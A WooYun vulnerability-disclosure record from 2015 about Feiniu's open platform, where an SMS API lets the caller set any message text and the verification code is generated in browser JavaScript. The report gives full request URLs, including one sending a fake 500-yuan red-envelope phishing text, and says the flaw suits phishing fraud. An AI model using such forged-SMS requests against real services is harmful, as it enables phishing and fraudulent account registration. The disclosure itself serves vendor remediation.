{"id": 76525, "wybug_id": "wooyun-2015-0164701", "wybug_title": "飞牛网某平台存在短信伪造漏洞和绕过短信验证码任意手机注册漏洞", "wybug_corp": "飞牛网", "wybug_author": "greensoul", "wybug_date": "2015-12-25 17:27", "wybug_open_date": "2016-02-09 23:29", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计不当", "认证设计不合理", "设计错误", "设计缺陷", "手机短信"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-09：\t细节向公众公开  简要描述： 可向任意用户发送任意内容短信，很适合用来钓鱼诈骗 详细说明：  飞牛网开放平台注册处,短信验证码存在两个问题:1.可伪造短信内容2.短信验证码在客户端生成\n\n来看看获取验证码的请求\nhttp://api.feiniu.com/getpassword/sendmessage.do?receiveChannel=1&sendReceiver=18888888888&content=270335&receiveType=3&templateTemp=亲爱的用户您好，您的验证码为##content##&_=1451032868884\n看到content参数和templateTemp参数了吗.这简直了....目测templateTemp就验证短信的内容来测试一下.\nhttp://api.feiniu.com/getpassword/sendmessage.do?receiveChannel=1&sendReceiver=18888888888&content=226540&receiveType=3&templateTemp=尊敬的客户,您好.为答谢您长久以来对飞牛网的支持.飞牛网特送出价值500元的无门槛春节大红包一份.请点击http://www.wooyun.org&_=1451031865099\n\n\n再来看看content\nhttp://api.feiniu.com/static/js/modules/messageValidation.js\n\n//绑定获取短信\t$(\"button[data-role='messagebutton']\").off(\"click\").on(\"click\",function(){\t\tvar mobilnumber=$(\"#mobilnumber\").val();\t\tif(!validateNotNull('mobilnumber')){\t\t\talert(\"请输入手机号\");\t\t\treturn false;\t\t}else if(!validateMobile(mobilnumber)){\t\t\talert(\"手机号格式不正确\");\t\t\treturn false;\t\t}\t\tcode=generCde(\"phonemessageId\");\t\tvar params={\t\t\t\treceiveChannel:\"1\",\t\t\t\tsendReceiver:mobilnumber,\t\t\t\tcontent:code,\t\t\t\treceiveType:\"3\",\t\t\t\ttemplateTemp:\"亲爱的用户您好，您的验证码为##content##\"\t\t\t\t\t\t\t};\t\tvar state=sendMsg(params);\t\tif(state=='1'){\t\t\tstartTimer(\"phonemessageId\");\t\t}\t\t\t});\n再来看看generCde\n//生成六位随机数function generCde(btnId){\tcode='';\tcurCount=count;\t\tfor ( var i = 0; i < codeLength; i++) {  \t\t     code += parseInt(Math.random() * 9).toString();  \t\t            \t     }\t// 设置button效果，开始计时  \t     return code;}\ncontent的内容就是js生成6位随机数.这就是短信验证码.   漏洞证明：  收到短信\n\n成功注册18888888888\n\n   修复方案：  不要相信用户   版权声明：转载请注明来源 greensoul@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-12-28 10:02 厂商回复： 感谢对飞牛安全的关注，马上安排人员进行修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}